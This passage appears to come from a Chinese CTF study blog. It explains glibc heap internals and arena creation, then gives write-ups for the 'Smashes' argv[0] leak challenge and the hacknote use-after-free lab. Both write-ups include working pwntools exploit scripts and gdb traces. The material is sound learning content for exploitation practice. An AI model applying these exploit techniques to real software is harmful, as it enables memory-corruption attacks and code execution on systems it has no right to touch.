如果存在类似chunk结构的内存，则可以通过free它在free_list追加它的地址。stack或者bss上进行free，下次malloc将返回GOT或者stack地址。这种攻击现在仍然有效。 House of Prime 确认一个chunk是否属于fastbins，是通过arena中的av-&gt;max_fast作为阈值来确定的。因此，如果将av-&gt;max_fast伪造为较大的值，则可以将任意内容注册为fastbins。对8比特size的chunk(原本最小size的chunk是16比特，伪造成8比特)进行free时，会注册到av-&gt;fastbinsY[-1]。这意味着在av-&gt;fastbinsY[]之前的变量av-&gt;max_fast被重写为较大的值。接下来，当free另一个chunk时，即便是size非常大的chunk，只要在av-&gt;m ax_fast以下，就会被作为fastbins处理，那么它将在超出av-&gt;fastbinsY[]限制的数组中注册。因此，可以覆盖av-&gt;fastbinsY[]之后的av-&gt;arena_key。这是多线程程序中有意义的arena指针。下一次进行malloc时，av-&gt;arena_key会被覆盖，引用它就能够获得arena。这相当于处理一个刚被free成arena的大的chunk。如果在这个chunk的fastbinsY[]或者bins[]，unsorted_chunks等设置GOt，那么在free后，malloc则会返回GOt。现在此方法已失效，因为已经不存在av-&gt;max_fast，已经更改为一个global_max_fast的全局变量。 how2heapShellphish战队的资料 https://github.com/shellphish/how2heap fastbin dup fastbin dup into stack unsafe unlink poison null byte overlapping chunks … 1. thread arenamalloc(-1) malloc或者new，参数作为unsigned long处理，所以附属会变得非常大 即使是单线程，也会发生切换到thread arena(mmap-ed arena) malloc和new基本是相同的，下面用malloc解释 分析malloc(-1) malloc()内部是怎么样的 这里用glibc(2.19)的源码 http://osxr.org:8080/glibc/source/malloc/malloc.c 从__libc_malloc()入手比较好 是一个strong_alias ar_ptr是指向管理整个heap的arena的指针 虽然程序启动时只有一个arena，但多线程可以生成多个arena malloc option的setup __malloc_hook有设置的话则会调用它。通常，第一次调用malloc()时，会包含malloc_hook_ini() 的地址。 这在内部被称为ptmalloc_init()，如果malloc的操作变更由环境变量指定，则相应的由__libc_mallopt()反映 之后，main_arena的地址作为[当前arena]保存在TLS区域中，并且再次调用__libc_malloc(bytes) TLS区域：Thread Local Storage。 C语言的static变量或者全局变量保存在data或者bss中。通常，多线程程序的内存空间在线程之间是通用的，因此，相同的值存储在所有线程中。但是，某些情况下想要在不同线程之间使用不同的静态或者全局变量，则可以用过TLS机制使得每个线程都是独立的全局变量。 此时，用作保存的区域是TLS区域，并且为每个线程分配了不同的存储区域（因为线程共享存储空间，因此TLS区域等于存储空间中的线程数）。访问时，将根据每个线程保存的key来确定使用哪个TLS区域。 获得当前crena 通过arena_lookup()获取TLS区域中当前arena的地址 如果是单线程，TLS只有一个，获得的就是之前设置的main_arena 如果是pthread_create()创建的多线程，每个线程都有一个单独的TLS，因为在创建线程后立即清零，所以获得的返回值是0 锁定当前arena 通过mutex_lock对main_aren进行锁定 通过 _int_malloc()，从main_aren申请内存 _int_malloc(ar_ptr, -1) 64位环境下， -1 == 0xffffffffffffffff，内存分配失败 因为堆中内存分配失败，此时victim = 0 进行重试，在内部生成新的arena 因为内存分配失败，尝试变更arena 调用arena_get2()，尝试选择不是main_arena的arena 首先，获取arena的最大个数 如果当前arena的数量小于最大数量，则会生成新的arena 如果当前数量已经到达最大数量，则从现有arena中选择 生成新的arena 更新TLS区域中当前arena的指针，以优先使用新生成的arena 返回新的arena 这就是thread arena（并不是正式叫法） 从arena_get_retry()返回后，使用thread arena尝试重新分配内存，失败 使用thread arena，再次调用_int_malloc()，结果也是失败 解锁，malloc()返回NULL unlock 返回NULL 动态调试一个简单的例子： 12345#include &lt;malloc.h&gt; int main(void)&#123; malloc(-1); return 0; &#125; 程序运行后main_arena内部大概是这样，next指向main_arena自身 第一次调用设置__malloc_hook的malloc_hook_ini()，即便停止也会跳过一次。malloc_hook_ini()结束后，TLS区域中设置了地址。 搜索包含main_arena地址的地址，在mapped中也发现有 指向main_arena的有两个，next和TLS区域 这个是TLS区域中指向当前arena的指针的地址(0x7ffff7fed700) 调用arena_get2()后，生成了新的arena 调用arena_get2()后，main_arena内部是这样，next的地址改变了 TLS区域中指向arena的地址也改变了 新的arena，bins的初始化也完成了 next指向main_arena 对比arena_get2()调用前后的内存映射状态，可以看出原本的arena(main_arena)是在bss区域，新生成的arena是通过mmap获取的内存 mapped内存区域前面，是_heap_info结构体 后面配置了thread arena 图示大概这样 后面是heap的chunk使用的区域 malloc(-1) X 2那么，thread arena生成后，再次调用malloc(-1)呢？ 通过arena_lookup()，从TLS区域获得arena的地址（更新后的thread arena地址） 通过mutex_lock锁定thread arena _int_malloc()失败 调用arena_get_retry() 第二次满足这个分支判断 不需要关注ar_ptr-&gt;next，只需要将arena切换到main_arena(不调用arena_get2()，不会生成thread arena) malloc(-1)总结 TLS的指针 当前arena由TLS区域的指针变量进行管理 arena 管理heap区域的arena，原本只有main_arena一个 通过malloc(-1)的失败，生成thread arena TLS区域的指针变量，也变成指向thread arena thread arena的数量 每个线程最多一个thread arena（加上main_arena共两个） 多数情况下，thread arena与线程一一对应 但是也存在线程间共用thread arena的情况 达到arena的最大值，会出现这种情况 补充以前的malloc()实现 在arena_get2()中，从上次lock成功的arena，通过跟随next使用lock成功的arena 全部失败才会创建新的arena 现代malloc()实现 — 通过pthreads创建多线程的情况 生成线程时，TLS区域也是新生成的 在新的TLS中，当前arena的指针被清空 因此，线程中第一次调用malloc时必定会调用arena_get2()，基本上会为每个线程创建一个thread arena 但是arena的数量存在最大值，如果超出，arena_get2()会使用已存在的arena作为当前arena（reused_arena()，通过arena的next来选择一个arena使用） 这种情况下，会存在同一个arena被多个线程使用 现代malloc()实现 — 其它方式(clone之类)创建多线程的情况 TLS不是专门新建的 当然，TLS区域也不会清零 因此，各个线程都使用相同的arena 参考资料https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/ new(-1) new(-1)也是类似的情况 获取sz参数 malloc(sz) 如果失败，抛出一个std::bad_alloc异常(如果有对应的异常处理程序，则调用它) https://gcc.gnu.org/viewcvs/gcc/trunk/libstdc%2B%2B-v3/libsupc%2B%2B/new_op.cc?view=markup https://cpplover.blogspot.jp/2010/07/operator-new.html","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Smashes","slug":"Smashes","date":"2019-07-11T06:49:44.000Z","updated":"2019-07-11T06:50:26.515Z","comments":true,"path":"2019/07/11/Smashes/","link":"","permalink":"https://darkwing.moe/2019/07/11/Smashes/","excerpt":"","text":"题目信息 Smashes, try your best to smash!!! nc pwn.jarvisoj.com 9877 https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229 开了NX和Canary： 静态分析 题目就是简单地接受输入，要求overwrite，但因为有canary不能直接溢出，那么就可以考虑argv[0] leak，通过溢出覆盖argv[0]的地址，然后根据smashes信息获取覆盖地址的内容 另外文件中有很像flag的字串，但服务器上肯定不是这串，既然flag就在程序中，那么泄露的内容就确定了，但是程序执行的过程中会把flag给修改了，这里有个小知识，当ELF文件比较小的时候，他的不同区段可能会被多次映射，也就是说flag可能有备份，gdb查找一下 ： 在0x400d21有一处备份，那么我们就可以将argv[0]覆盖为0x400d21，来获取flag的值 exploit1234567891011121314151617from pwn import *elf = ELF('./smashes')sh = remote('pwn.jarvisoj.com', 9877)# sh = process('./smashes')context.arch = elf.arch# context.log_level = 'debug'flag_addr = 0x400D20sh.recvuntil(\"name?\")payload = p64(flag_addr) * 200sh.sendline(payload)sh.recvuntil('flag:')sh.sendline(\"1\")sh.interactive()","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"hacknote -- Use After Free","slug":"hacknote-Use-After-Free","date":"2019-07-10T07:10:07.000Z","updated":"2019-07-10T07:10:50.563Z","comments":true,"path":"2019/07/10/hacknote-Use-After-Free/","link":"","permalink":"https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/","excerpt":"","text":"根据这个： https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/ 原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。 例子这里我们以 HITCON-training 中的 lab 10 hacknote 为例。 功能分析我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有 1234puts(\" 1. Add note \");puts(\" 2. Delete note \");puts(\" 3. Print note \");puts(\" 4. Exit \"); 故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。 add_note根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add_note()&#123; note *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( count &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !notelist[i] ) &#123; notelist[i] = malloc(8u); if ( !notelist[i] ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; notelist[i]-&gt;put = print_note_content; printf(\"Note size :\"); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = notelist[i]; v0-&gt;content = malloc(size); if ( !notelist[i]-&gt;content ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; printf(\"Content :\"); read(0, notelist[i]-&gt;content, size); puts(\"Success !\"); ++count; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(\"Full\"); &#125; return __readgsdword(0x14u) ^ v5;&#125; 函数源码： 1234567891011121314151617181920212223242526272829303132void add_note() &#123; int i; char buf[8]; int size; if (count &gt; 5) &#123; puts(\"Full\"); return; &#125; for (i = 0; i &lt; 5; i++) &#123; if (!notelist[i]) &#123; notelist[i] = (struct note *)malloc(sizeof(struct note)); if (!notelist[i]) &#123; puts(\"Alloca Error\"); exit(-1); &#125; notelist[i]-&gt;printnote = print_note_content; printf(\"Note size :\"); read(0, buf, 8); size = atoi(buf); notelist[i]-&gt;content = (char *)malloc(size); if (!notelist[i]-&gt;content) &#123; puts(\"Alloca Error\"); exit(-1); &#125; printf(\"Content :\"); read(0, notelist[i]-&gt;content, size); puts(\"Success !\"); count++; break; &#125; &#125;&#125; print_noteprint_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容。 12345678910111213141516171819unsigned int print_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( notelist[v1] ) notelist[v1]-&gt;put(notelist[v1]); return __readgsdword(0x14u) ^ v3;&#125; 函数源码： 1234567891011121314void print_note() &#123; char buf[4]; int idx; printf(\"Index :\"); read(0, buf, 4); idx = atoi(buf); if (idx &lt; 0 || idx &gt;= count) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if (notelist[idx]) &#123; notelist[idx]-&gt;printnote(notelist[idx]); &#125;&#125; del_notedel_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。 1234567891011121314151617181920212223unsigned int del_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( notelist[v1] ) &#123; free(notelist[v1]-&gt;content); free(notelist[v1]); puts(\"Success\"); &#125; return __readgsdword(0x14u) ^ v3;&#125; 函数源码： 12345678910111213141516void del_note() &#123; char buf[4]; int idx; printf(\"Index :\"); read(0, buf, 4); idx = atoi(buf); if (idx &lt; 0 || idx &gt;= count) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if (notelist[idx]) &#123; free(notelist[idx]-&gt;content); free(notelist[idx]); puts(\"Success\"); &#125;&#125; 利用分析我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。 那么该怎么执行呢？ 我们可以简单来看一下每一个 note 生成的具体流程 程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。 程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。 123456789+-----------------+ | put | +-----------------+ | content | size +-----------------+-------------------&gt;+----------------+ | real | | content | | | +----------------+ 那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下 申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可） 申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可） 释放 note0 释放 note1 此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0 申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则 note2 其实会分配 note1 对应的内存块。 real content 对应的 chunk 其实是 note0。 如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *r = process('./hacknote')def addnote(size, content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def delnote(idx): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx))def printnote(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))gdb.attach(r)magic = 0x08048986addnote(32, \"aaaa\") # add note 0addnote(32, \"ddaa\") # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8, p32(magic)) # add note 2printnote(0) # print note 0r.interactive() 脚本中使用gdb.attach(r)进行调试 我们可以具体看一下执行的流程，首先先下断点 magic地址，add_note中两处malloc地址，del_note中两处free地址： 123450x8048986 &lt;magic&gt;: 0x83e589550x080486ca &lt;+84&gt;: call 0x80484e0 &lt;malloc@plt&gt;0x0804875c &lt;+230&gt;: call 0x80484e0 &lt;malloc@plt&gt;0x08048893 &lt;+143&gt;: call 0x80484c0 &lt;free@plt&gt;0x080488a9 &lt;+165&gt;: call 0x80484c0 &lt;free@plt&gt; 两处 malloc 下断点 1234gef➤ b *0x0804875CBreakpoint 1 at 0x804875cgef➤ b *0x080486CABreakpoint 2 at 0x80486ca 两处 free 下断点 1234gef➤ b *0x08048893Breakpoint 3 at 0x8048893gef➤ b *0x080488A9Breakpoint 4 at 0x80488a9 （以下地址为我本地测试数据，和ctf-wiki有区别，请自行调试） 然后继续执行程序，可以看出申请 note0 时，所申请到的内存块地址为 0x09fc2160。（eax 存储函数返回值） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$eax : 0x09fc2160 → 0x00000000$ebx : 0x0 $ecx : 0x21e99 $edx : 0x09fc2160 → 0x00000000$esp : 0xff8c2850 → 0x00000008$ebp : 0xff8c2888 → 0xff8c28a8 → 0x00000000$esi : 0xf7ecc000 → 0x001d7d6c (&quot;l&#125;&quot;?)$edi : 0x0 $eip : 0x080486cf → &lt;add_note+89&gt; add esp, 0x10$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xff8c2850│+0x0000: 0x00000008 ← $esp0xff8c2854│+0x0004: 0x000000000xff8c2858│+0x0008: 0xf7d26375 → &lt;strtol+5&gt; add eax, 0x1a5c8b0xff8c285c│+0x000c: 0xf7d22b50 → &lt;atoi+16&gt; add esp, 0x1c0xff8c2860│+0x0010: 0xff8c2898 → 0xff8c0a31 → 0x000000000xff8c2864│+0x0014: 0x000000000xff8c2868│+0x0018: 0x0000000a0xff8c286c│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x80486c2 &lt;add_note+76&gt; add DWORD PTR [eax], eax 0x80486c4 &lt;add_note+78&gt; add BYTE PTR [ebx+0x86a0cec], al 0x80486ca &lt;add_note+84&gt; call 0x80484e0 &lt;malloc@plt&gt; → 0x80486cf &lt;add_note+89&gt; add esp, 0x10 0x80486d2 &lt;add_note+92&gt; mov edx, eax 0x80486d4 &lt;add_note+94&gt; mov eax, DWORD PTR [ebp-0x1c] 0x80486d7 &lt;add_note+97&gt; mov DWORD PTR [eax*4+0x804a070], edx 0x80486de &lt;add_note+104&gt; mov eax, DWORD PTR [ebp-0x1c] 0x80486e1 &lt;add_note+107&gt; mov eax, DWORD PTR [eax*4+0x804a070]─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;hacknote&quot;, stopped, reason: SINGLE STEP───────────────────────────────────────────────────────────────────── trace ────[#0] 0x80486cf → add_note()[#1] 0x8048ac5 → main()[#2] 0xf7d0ce81 → __libc_start_main(main&#x3D;0x8048a38 &lt;main&gt;, argc&#x3D;0x1, argv&#x3D;0xff8c2954, init&#x3D;0x8048b00 &lt;__libc_csu_init&gt;, fini&#x3D;0x8048b60 &lt;__libc_csu_fini&gt;, rtld_fini&#x3D;0xf7f009b0 &lt;_dl_fini&gt;, stack_end&#x3D;0xff8c294c)[#3] 0x8048581 → _start()────────────────────────────────────────────────────────────────────────────────0x080486cf in add_note ()gef➤ heap chunk 0x09fc2160Chunk(addr&#x3D;0x9fc2160, size&#x3D;0x10, flags&#x3D;PREV_INUSE)Chunk size: 16 (0x10)Usable size: 12 (0xc)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 申请 note 0 的 content 的地址为 0x09fc2170 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$eax : 0x09fc2170 → 0x00000000$ebx : 0x09fc2160 → 0x0804865b → &lt;print_note_content+0&gt; push ebp$ecx : 0x21e69 $edx : 0x09fc2170 → 0x00000000$esp : 0xff8c2850 → 0x00000020$ebp : 0xff8c2888 → 0xff8c28a8 → 0x00000000$esi : 0xf7ecc000 → 0x001d7d6c (&quot;l&#125;&quot;?)$edi : 0x0 $eip : 0x08048761 → &lt;add_note+235&gt; add esp, 0x10$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xff8c2850│+0x0000: 0x00000020 ← $esp0xff8c2854│+0x0004: 0xff8c2874 → 0xf70a32330xff8c2858│+0x0008: 0x000000080xff8c285c│+0x000c: 0xf7d22b50 → &lt;atoi+16&gt; add esp, 0x1c0xff8c2860│+0x0010: 0xff8c2898 → 0xff8c0a31 → 0x000000000xff8c2864│+0x0014: 0x000000000xff8c2868│+0x0018: 0x0000000a0xff8c286c│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048752 &lt;add_note+220&gt; mov al, ds:0x458b0804 0x8048757 &lt;add_note+225&gt; call 0x581173df 0x804875c &lt;add_note+230&gt; call 0x80484e0 &lt;malloc@plt&gt; → 0x8048761 &lt;add_note+235&gt; add esp, 0x10 0x8048764 &lt;add_note+238&gt; mov DWORD PTR [ebx+0x4], eax 0x8048767 &lt;add_note+241&gt; mov eax, DWORD PTR [ebp-0x1c] 0x804876a &lt;add_note+244&gt; mov eax, DWORD PTR [eax*4+0x804a070] 0x8048771 &lt;add_note+251&gt; mov eax, DWORD PTR [eax+0x4] 0x8048774 &lt;add_note+254&gt; test eax, eax─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;hacknote&quot;, stopped, reason: SINGLE STEP───────────────────────────────────────────────────────────────────── trace ────[#0] 0x8048761 → add_note()[#1] 0x8048ac5 → main()[#2] 0xf7d0ce81 → __libc_start_main(main&#x3D;0x8048a38 &lt;main&gt;, argc&#x3D;0x1, argv&#x3D;0xff8c2954, init&#x3D;0x8048b00 &lt;__libc_csu_init&gt;, fini&#x3D;0x8048b60 &lt;__libc_csu_fini&gt;, rtld_fini&#x3D;0xf7f009b0 &lt;_dl_fini&gt;, stack_end&#x3D;0xff8c294c)[#3] 0x8048581 → _start()────────────────────────────────────────────────────────────────────────────────0x08048761 in add_note ()gef➤ heap chunk 0x09fc2170Chunk(addr&#x3D;0x9fc2170, size&#x3D;0x30, flags&#x3D;PREV_INUSE)Chunk size: 48 (0x30)Usable size: 44 (0x2c)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 类似的，我们可以得到 note1 的地址以及其 content 的地址分别为 0x09fc21a0 和 0x09fc21b0。 同时，我们还可以看到 note0 与 note1 对应的 content 确实是相应的内存块。 12345678gef➤ grep aaaa[+] Searching &#39;aaaa&#39; in memory[+] In &#39;[heap]&#39;(0x9fc2000-0x9fe4000), permission&#x3D;rw- 0x9fc2170 - 0x9fc2174 → &quot;aaaa&quot; gef➤ grep ddaa[+] Searching &#39;ddaa&#39; in memory[+] In &#39;[heap]&#39;(0x9fc2000-0x9fe4000), permission&#x3D;rw- 0x9fc21b0 - 0x9fc21b4 → &quot;ddaa&quot; 下面就是 free 的过程了。我们可以依次发现首先，note0 的 content 被 free 123456789101112→ 0x8048893 &lt;del_note+143&gt; call 0x80484c0 &lt;free@plt&gt; ↳ 0x80484c0 &lt;free@plt+0&gt; jmp DWORD PTR ds:0x804a018 0x80484c6 &lt;free@plt+6&gt; push 0x18 0x80484cb &lt;free@plt+11&gt; jmp 0x8048480 0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp DWORD PTR ds:0x804a01c 0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push 0x20 0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp 0x8048480─────────────────────────────────────────────────────── arguments (guessed) ────free@plt ( [sp + 0x0] &#x3D; 0x09fc2170 → &quot;aaaa&quot;, [sp + 0x4] &#x3D; 0xff8c2878 → 0xf7ec0a30 → 0x00200e46) 然后是 note0 本身 123456789101112 → 0x80488a9 &lt;del_note+165&gt; call 0x80484c0 &lt;free@plt&gt; ↳ 0x80484c0 &lt;free@plt+0&gt; jmp DWORD PTR ds:0x804a018 0x80484c6 &lt;free@plt+6&gt; push 0x18 0x80484cb &lt;free@plt+11&gt; jmp 0x8048480 0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp DWORD PTR ds:0x804a01c 0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push 0x20 0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp 0x8048480─────────────────────────────────────────────────────── arguments (guessed) ────free@plt ( [sp + 0x0] &#x3D; 0x09fc2160 → 0x0804865b → &lt;print_note_content+0&gt; push ebp, [sp + 0x4] &#x3D; 0xff8c2878 → 0xf7ec0a30 → 0x00200e46) 当 delete 结束后，我们观看一下 bins，可以发现，确实其被存放在对应的 fast bin 中，(我这里因为测试环境版本问题，是Tcachebins，但可以看到两个地址是对的 123456789101112gef➤ heap bins ─────────────────────── Tcachebins for arena 0xf7ecc7a0 ───────────────────────Tcachebins[idx&#x3D;2, size&#x3D;0x18] count&#x3D;1 ← Chunk(addr&#x3D;0x9fc2160, size&#x3D;0x10, flags&#x3D;PREV_INUSE) Tcachebins[idx&#x3D;4, size&#x3D;0x28] count&#x3D;0 ← Chunk(addr&#x3D;0x9fc2170, size&#x3D;0x30, flags&#x3D;PREV_INUSE) ──────────────────────── Fastbins for arena 0xf7ecc7a0 ────────────────────────Fastbins[idx&#x3D;0, size&#x3D;0x8] 0x00Fastbins[idx&#x3D;1, size&#x3D;0x10] 0x00Fastbins[idx&#x3D;2, size&#x3D;0x18] 0x00Fastbins[idx&#x3D;3, size&#x3D;0x20] 0x00Fastbins[idx&#x3D;4, size&#x3D;0x28] 0x00Fastbins[idx&#x3D;5, size&#x3D;0x30] 0x00Fastbins[idx&#x3D;6, size&#x3D;0x38] 0x00 当我们将 note1 也全部删除完毕后，再次观看 bins。可以看出，后删除的 chunk 块确实处于表头。 123456789101112gef➤ heap bins─────────────────────── Tcachebins for arena 0xf7f217a0 ───────────────────────Tcachebins[idx&#x3D;2, size&#x3D;0x18] count&#x3D;2 ← Chunk(addr&#x3D;0x9cec1a0, size&#x3D;0x10, flags&#x3D;PREV_INUSE) ← Chunk(addr&#x3D;0x9cec160, size&#x3D;0x10, flags&#x3D;PREV_INUSE) Tcachebins[idx&#x3D;4, size&#x3D;0x28] count&#x3D;0 ← Chunk(addr&#x3D;0x9cec1b0, size&#x3D;0x30, flags&#x3D;PREV_INUSE) ← Chunk(addr&#x3D;0x9cec170, size&#x3D;0x30, flags&#x3D;PREV_INUSE) ──────────────────────── Fastbins for arena 0xf7f217a0 ────────────────────────Fastbins[idx&#x3D;0, size&#x3D;0x8] 0x00Fastbins[idx&#x3D;1, size&#x3D;0x10] 0x00Fastbins[idx&#x3D;2, size&#x3D;0x18] 0x00Fastbins[idx&#x3D;3, size&#x3D;0x20] 0x00Fastbins[idx&#x3D;4, size&#x3D;0x28] 0x00Fastbins[idx&#x3D;5, size&#x3D;0x30] 0x00Fastbins[idx&#x3D;6, size&#x3D;0x38] 0x00 那么，此时即将要申请 note2，我们可以看下 note2 都申请到了什么内存块，如下 申请 note2 对应的内存块为 0x09cec1a0，其实就是 note1 对应的内存地址。 12345678910111213141516171819202122232425$eax : 0x09cec1a0 → 0x09cec160 → 0x00000000$ebx : 0x0 $ecx : 0x09cec010 → 0x00020001$edx : 0x09cec1a0 → 0x09cec160 → 0x00000000$esp : 0xffca8fb0 → 0x00000008$ebp : 0xffca8fe8 → 0xffca9008 → 0x00000000$esi : 0xf7f21000 → 0x001d7d6c (&quot;l&#125;&quot;?)$edi : 0x0 $eip : 0x080486cf → &lt;add_note+89&gt; add esp, 0x10$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffca8fb0│+0x0000: 0x00000008 ← $esp0xffca8fb4│+0x0004: 0x000000040xffca8fb8│+0x0008: 0xf7d7b375 → &lt;strtol+5&gt; add eax, 0x1a5c8b0xffca8fbc│+0x000c: 0xf7d77b50 → &lt;atoi+16&gt; add esp, 0x1c0xffca8fc0│+0x0010: 0xffca8ff8 → 0xffca0a31 → 0x000000000xffca8fc4│+0x0014: 0x000000000xffca8fc8│+0x0018: 0x0000000a0xffca8fcc│+0x001c: 0x00000002─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x80486c2 &lt;add_note+76&gt; add DWORD PTR [eax], eax 0x80486c4 &lt;add_note+78&gt; add BYTE PTR [ebx+0x86a0cec], al 0x80486ca &lt;add_note+84&gt; call 0x80484e0 &lt;malloc@plt&gt; → 0x80486cf &lt;add_note+89&gt; add esp, 0x10 申请 note2 的 content 的内存地址为 0x804b008，就是 note0 对应的地址，即此时我们向 note2 的 content 写内容，就会将 note0 的 put 字段覆盖。 12345678910111213141516171819202122232425$eax : 0x09cec160 → 0x00000000$ebx : 0x09cec1a0 → 0x0804865b → &lt;print_note_content+0&gt; push ebp$ecx : 0x09cec010 → 0x00020000$edx : 0x09cec160 → 0x00000000$esp : 0xffca8fb0 → 0x00000008$ebp : 0xffca8fe8 → 0xffca9008 → 0x00000000$esi : 0xf7f21000 → 0x001d7d6c (&quot;l&#125;&quot;?)$edi : 0x0 $eip : 0x08048761 → &lt;add_note+235&gt; add esp, 0x10$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffca8fb0│+0x0000: 0x00000008 ← $esp0xffca8fb4│+0x0004: 0xffca8fd4 → 0x00000a38 (&quot;8&quot;?)0xffca8fb8│+0x0008: 0x000000080xffca8fbc│+0x000c: 0xf7d77b50 → 